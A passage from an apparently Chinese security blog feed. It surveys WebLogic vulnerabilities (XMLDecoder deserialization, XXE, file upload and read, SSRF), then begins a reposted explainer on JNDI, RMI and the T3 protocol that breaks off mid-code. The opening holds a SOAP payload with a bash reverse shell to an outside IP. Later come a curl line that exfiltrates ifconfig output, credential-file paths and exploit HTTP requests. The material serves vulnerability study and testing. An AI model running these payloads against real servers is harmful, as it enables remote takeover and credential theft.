class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">'2'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;<span class="symbol">&amp;amp;</span> /dev/tcp/192.168.209.1/1234 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">'start'</span> /&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看到这回是利用class标签构造类，但是由于限制了method从而无法调用函数，因此，找了几个可以通过构造函数进行反序列化的类。网上通用的有</p>
<ul>
<li><code>FileSystemXmlApplicationContext</code></li>
<li><code>UnitOfWorkChangeSet</code></li>
</ul>
<p>利用方式可参考 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Flufeirider%2FCVE-2019-2725" target="_blank" rel="noopener">https://github.com/lufeirider/CVE-2019-2725</a></p>
<h5 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h5><blockquote>
<p>翻译，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F5496" target="_blank" rel="noopener">https://xz.aliyun.com/t/5496</a></p>
</blockquote>
<p>这个漏洞是CVE-2019-2725的Bypass，对于JDK1.6，使用<code>&lt;array method ="forName"&gt;</code>标记有效地替换了<code>&lt;class&gt;</code>标记的功能。只需用<code>&lt;array method ="forName"&gt;</code>标签替换<code>&lt;class&gt;</code>标签就可以有效地绕过黑名单。</p>
<p>利用可以参考下面列出的漏洞检测脚本，改个命令即可。也可以参考这个，<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwaffl3ss%2FCVE-2019-2729%2Fblob%2Fmaster%2FCVE-2019-2729.py" target="_blank" rel="noopener">https://github.com/waffl3ss/CVE-2019-2729/blob/master/CVE-2019-2729.py</a></p>
<blockquote>
<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Fvuls%2F206374.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/206374.html</a><br> 根据近些年 weblogic 由于 XMLDecoder 导致的反序列漏洞的缝缝补补中，可以看到虽然绕过的 poc 层出不穷，但是利用的范围却越来越窄，从一开始的所有 jdk 通用，到 7u21 以下可以利用成功，再到最近的绕过已经只能在 1.6 利用成功，可以看到，<strong>保持jdk 版本的高版本</strong>可以有效的防范 java 反序列化攻击。与此同时，对于基本用不到的 weblogic 组件，还是能删就删为好。</p>
</blockquote>
<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.seebug.org%2F906%2F" target="_blank" rel="noopener">https://paper.seebug.org/906/</a></p>
<blockquote>
<p>可以利用XXE读取<code>base_domain</code>中的名为<code>SerializedSystemIni.dat</code>的密钥和<code>config.xml</code>密文，用<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Fblob%2Fmaster%2Fweblogic%2Fweak_password%2Fdecrypt%2Fweblogic_decrypt.jarhttps%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Fblob%2Fmaster%2Fweblogic%2Fweak_password%2Fdecrypt%2Fweblogic_decrypt.jar" target="_blank" rel="noopener">weblogic_decrypt.jar</a>解密weblogic的登陆密码。<br> 11g的密文在<br> <code>安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code><br> 密钥在<code>安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code><br> 10的密文在<br> <code>安装目录/samples/domains/wl_server/security/boot.properties</code></p>
</blockquote>
<ul>
<li>任意文件上传(CVE-2018-2894)，需要登陆，参考：<ul>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cnblogs.com%2Fbmjoker%2Fp%2F9825497.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9825497.html</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Ftree%2Fmaster%2Fweblogic%2FCVE-2018-2894" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></li>
</ul>
</li>
</ul>
<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="CVE-2019-2618"><a href="#CVE-2019-2618" class="headerlink" title="CVE-2019-2618"></a>CVE-2019-2618</h5><p>CVE-2019-2618漏洞主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。<strong>登录weblogic之后</strong>，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。<br>另外，weblogic的DeploymentService接口的正常功能本来就能部署war包。</p>
<p>利用方式参考：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjas502n%2Fcve-2019-2618" target="_blank" rel="noopener">https://github.com/jas502n/cve-2019-2618</a></p>
<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><h5 id="CVE-2019-2615"><a href="#CVE-2019-2615" class="headerlink" title="CVE-2019-2615"></a>CVE-2019-2615</h5><p>需要登陆后才能利用。</p>
<figure class="highlight swift"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">GET</span> /bea_wls_management_internal2/wl_management <span class="type">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="type">Host</span>: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7001</span></span><br><span class="line"><span class="type">User</span>-<span class="type">Agent</span>: <span class="type">Mozilla</span>/<span class="number">5.0</span> (<span class="type">Windows</span> <span class="type">NT</span> <span class="number">6.1</span>; <span class="type">Win64</span>; x64; rv:<span class="number">66.0</span>) <span class="type">Gecko</span>/<span class="number">20100101</span> <span class="type">Firefox</span>/<span class="number">66.0</span></span><br><span class="line"><span class="type">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,/;q=<span class="number">0.8</span></span><br><span class="line"><span class="type">Accept</span>-<span class="type">Language</span>: en-<span class="type">US</span>,en;q=<span class="number">0.5</span></span><br><span class="line"><span class="type">Accept</span>-<span class="type">Encoding</span>: gzip, deflate</span><br><span class="line">username:weblogic</span><br><span class="line">password:admin123456</span><br><span class="line">wl_request_type:wl_jsp_refresh_request</span><br><span class="line">adminPath:<span class="built_in">c</span>:\windows\win.ini</span><br></pre></td></tr></tbody></table></figure>

<h5 id="CVE-2014-4210-SSRF"><a href="#CVE-2014-4210-SSRF" class="headerlink" title="CVE-2014-4210 SSRF"></a>CVE-2014-4210 SSRF</h5><figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7000</span><br></pre></td></tr></tbody></table></figure>

<h4 id="关于命令回显"><a href="#关于命令回显" class="headerlink" title="关于命令回显"></a>关于命令回显</h4><p>在linux中，被反引号包裹的字符串会被解释为命令行</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `whoami` <span class="built_in">test</span></span><br><span class="line">root <span class="built_in">test</span></span><br></pre></td></tr></tbody></table></figure>

<p>windows下执行<code>set</code>可以看到一堆系统变量，用<code>%</code>号可以调用这些变量</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> %COMPUTERNAME%</span><br><span class="line">你的计算机名</span><br></pre></td></tr></tbody></table></figure>

<p><strong>命令注入：</strong>利用管道符来注入要执行的命令</p>
<p><img src="/posts/1610177997/image-20210623175135552.png" alt="image-20210623175135552"></p>
<p>还有个<code>|</code>，如<code>127.0.0.1|whoami</code>，回显的是<code>whoami</code>的结果</p>
<p>利用Ping命令和dnslog结合获取回显结果</p>
<figure class="highlight swift"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">C</span>:\<span class="type">Windows</span>\<span class="type">System32</span>\cmd.exe /<span class="built_in">c</span> <span class="string">"ping -n 3 test.com || ping -c 3 test.com"</span></span><br><span class="line">/bin/bash -<span class="built_in">c</span> <span class="string">"ping -n 3 test.com || ping -c 3 test.com"</span></span><br></pre></td></tr></tbody></table></figure>

<p>目测每个目标要执行两次POC,另外linux还可以通过curl命令来回显</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl test.com/`ifconfig|base64|tr <span class="string">'\n'</span> <span class="string">'-'</span>`</span><br></pre></td></tr></tbody></table></figure>

<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>只是检测是否存在漏洞，不是利用工具</p>
<ul>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frabbitmask%2FWeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2F0xn0ne%2FweblogicScanner.git" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner.git</a></li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.4hou.com%2Fvulnerable%2F12874.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/12874.html</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Ficematcha.win%2F%3Fp%3D1174" target="_blank" rel="noopener">https://icematcha.win/?p=1174</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.kingkk.com%2F2019%2F05%2FWeblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%2F" target="_blank" rel="noopener">https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FebKHjpbQcszAy_vPocW0Sg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2F5alt.me%2F2018%2F04%2Fweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95%2F" target="_blank" rel="noopener">weblogic反序列化漏洞分析与调试</a></li>
<li><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fqq_27446553%2Farticle%2Fdetails%2F78952010" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78952010</a></li>
<li><a href="https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>weblogic系列</category>
      </categories>
      <tags>
        <tag>weblogic,基础知识,漏洞分析,调试,历史漏洞,系列总结</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogicT3协议及T3反序列化漏洞简介</title>
    <url>/posts/914084023/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<blockquote>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。<br>本文链接：<a href="https://nosec.org/home/detail/2859.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2859.html</a><br>来源：<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&amp;chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1565607726135&amp;sharer_shareid=37947731a17f1281ace10f1fc77146cf&amp;key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&amp;ascene=1&amp;uin=MjMwMDM5OTYzMg%3D%3D&amp;devicetype=Windows+10&amp;version=62060833&amp;lang=zh_CN&amp;pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At" target="_blank" rel="noopener">奇安信</a><br>本文版权归原作者所有，如有侵权请联系我及时删除</p>
</blockquote>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>在研究WebLogic相关的漏洞的时候大家一定见过JNDI、RMI、JRMP、T3这些概念，简单的说，T3是WebLogic RMI调用时的通信协议，RMI又和JNDI有关系，JRMP是Java远程方法协议。我曾经很不清晰这些概念，甚至混淆。因此在我真正开始介绍T3协议及其反序列化漏洞之前，我会对这些概念进行一一介绍。</p>
<h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p><code>JNDI(Java Naming and Directory Interface)</code>是Java提供的<code>Java 命名和目录接口</code>。通过调用<code>JNDI</code>的<code>API</code>应用程序可以定位资源和其他程序对象。<code>JNDI</code>是<code>Java EE</code>的重要部分，需要注意的是它并不只是包含了<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
<p><strong>Naming Service 命名服务：</strong></p>
<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</p>
<p><strong>Directory Service 目录服务：</strong></p>
<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，<strong>还允许对象具有属性</strong>。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
<p><strong>Reference 引用：</strong></p>
<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
<p><img src="/posts/914084023/image-20210622142434793.png" alt="image-20210622142434793"></p>
<p>看一下常见的JNDI的例子：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">jdbc:<span class="comment">//&lt;domain&gt;:&lt;port&gt;rmi://&lt;domain&gt;:&lt;port&gt;ldap://&lt;domain&gt;:&lt;port&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>JNDI的查找一般使用<code>lookup()</code>方法如<code>registry.lookup(name)</code>。</p>
<h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h4><p>RMI(Remote Method Invocation)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。</p>
<p>Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点，后面会详细说。</p>
<p>举例说明：</p>
<p>假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。</p>
<p>这种设计和实现很像当今流行的Web API，只不过RMI只支持Java原生调用，程序员在写代码的时候和调用本地方法并无太大差别，也不用关心数据格式的转换和网络上的传输。类似的做法在ASP.NET中也有同样的实现叫WebServices。</p>
<p>RMI远程方法调用通常由以下几个部分组成：</p>
<ul>
<li>客户端对象</li>
<li>服务端对象</li>
<li>客户端代理对象（stub）</li>
<li>服务端代理对象（skeleton）</li>
</ul>
<p>下面来看一下最简单的Java RMI要如何实现：</p>
<p>首先创建服务端对象类，先创建一个接口继承<code>java.rmi.Remote</code>:</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// IHello.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>然后创建服务端对象类，实现这个接口：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> <span class="keyword">implements</span> <span class="title">IHello</span></span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Hello</span><span class="params">()</span> </span>{}</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, world!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>创建服务端远程对象骨架并绑定在JNDI Registry上：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Server.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span></span>{</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Server</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>{}</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>{</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">      <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">      Hello obj = <span class="keyword">new</span> Hello();</span><br><span class="line">      <span class="comment">// 创建服务端远程对象的骨架（skeleton）</span></span><br><span class="line">      IHello skeleton = (IHello) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">// 将服务端远程对象的骨架绑定到Registry上</span></span><br><span class="line">      Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">      registry.bind(<span class="string">"Hello"</span>, skeleton);</span><br><span class="line">      System.err.println(<span class="string">"Server ready"</span>);</span><br><span class="line">  } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">      System.err.println(<span class="string">"Server exception: "</span> + e.toString());</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">  }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>RMI的服务端已经构建完成，继续关注客户端：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Client.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Client</span><span class="params">()</span> </span>{}</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">    String host = (args.length &lt; <span class="number">1</span>) ? <span class="string">"127.0.0.1"</span> : args[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      Registry registry = LocateRegistry.getRegistry(host);</span><br><span class="line">      <span class="comment">// 创建客户端对象stub（存根）</span></span><br><span class="line">      IHello stub = (IHello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">      <span class="comment">// 使用存根调用服务端对象中的方法</span></span><br><span class="line">      String response = stub.sayHello();</span><br><span class="line">      System.out.println(<span class="string">"response: "</span> + response);</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">      System.err.println(<span class="string">"Client exception: "</span> + e.toString());</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>至此，简单的RMI服务和客户端已经构建完成，我们来看一下执行效果：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rmiregistry &amp;</span></span><br><span class="line">[1] 80849</span><br><span class="line"><span class="meta">$</span><span class="bash"> java Server &amp;</span></span><br><span class="line">[2] 80935</span><br><span class="line">Server ready</span><br><span class="line"><span class="meta">$</span><span class="bash"> java Client</span></span><br><span class="line">response: Hello, world!</span><br></pre></td></tr></tbody></table></figure>

<p>简单解释一下RMI的整个调用流程：</p>
<p><img src="/posts/914084023/image-20210622150725246.png" alt="image-20210622150725246"></p>
<ol>
<li>客户端通过客户端的Stub对象欲调用远程主机对象上的方法</li>
<li>Stub代理客户端处理远程对象调用请求，并且序列化调用请求后发送网络传输</li>
<li>服务端远程调用Skeleton对象收到客户端发来的请求，代理服务端反序列化请求，传给服务端</li>
<li>服务端接收到请求，方法在服务端执行然后将返回的结果对象传给Skeleton对象</li>
<li>Skeleton接收到结果对象，代理服务端将结果序列化，发送给客户端</li>
<li>客户端Stub对象拿到结果对象，代理客户端反序列化结果对象传给客户端</li>
</ol>
<h4 id="WebLogic-RMI"><a href="#WebLogic-RMI" class="headerlink" title="WebLogic RMI"></a>WebLogic RMI</h4><p>WebLogic RMI和T3反序列化漏洞有很大关系，因为T3就是WebLogic RMI所使用的协议。网上关于漏洞的PoC很多，但是我们通过那些PoC只能看到它不正常（漏洞触发）的样子，却很少能看到它正常工作的样子。那么我们就从WebLogic RMI入手，一起看看它应该是什么样的。</p>
<p><strong>WebLogic RMI就是WebLogic对Java RMI的实现</strong>，它和我刚才讲过的Java RMI大体一致，在功能和实现方式上稍有不同。我们来细数一下WebLogic RMI和Java RMI的不同之处。</p>
<ul>
<li>WebLogic RMI支持集群部署和负载均衡<br>因为WebLogic本身就是为分布式系统设计的，因此WebLogic RMI支持集群部署和负载均衡也不难理解了。</li>
<li>WebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象<br>WebLogic的字节码生成功能会自动生成服务端的字节码到内存。不再生成Skeleton骨架对象，也不需要使用<code>UnicastRemoteobject</code>对象。</li>
<li>WebLogic RMI客户端使用动态代理<br>在WebLogic RMI 客户端中，字节码生成功能会自动为客户端生成代理对象，因此<code>Stub</code>也不再需要。</li>
<li><strong>WebLogic RMI主要使用T3协议（还有基于CORBA的IIOP协议）进行客户端到服务端的数据传输</strong></li>
</ul>
<p>T3传输协议是WebLogic的自有协议，它有如下特点：</p>
<ol>
<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。<br>下面我再简单的实现一下WebLogic RMI，实现依据Oracle的WebLogic 12.2.1的官方文档，但是官方文档有诸多错误，所以我下面的实现和官方文档不尽相同但保证可以运行起来。</li>
</ol>
<p>首先依然是创建服务端对象类，先创建一个接口继承<code>java.rmi.Remote</code>:</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// IHello.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> examples.rmi.hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>{</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>创建服务端对象类，实现这个接口：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// HelloImpl.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello Remote World!!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>创建服务端远程对象，此时已不需要<code>Skeleton</code>对象和<code>UnicastRemoteobject</code>对象：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// HelloImpl.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> examples.rmi.hello;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException </span>{</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        name = s;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            HelloImpl obj = <span class="keyword">new</span> HelloImpl(<span class="string">"HelloServer"</span>);</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.bind(<span class="string">"HelloServer"</span>, obj);</span><br><span class="line">            System.out.println(<span class="string">"HelloImpl created and bound in the registry "</span> +</span><br><span class="line">                    <span class="string">"to the name 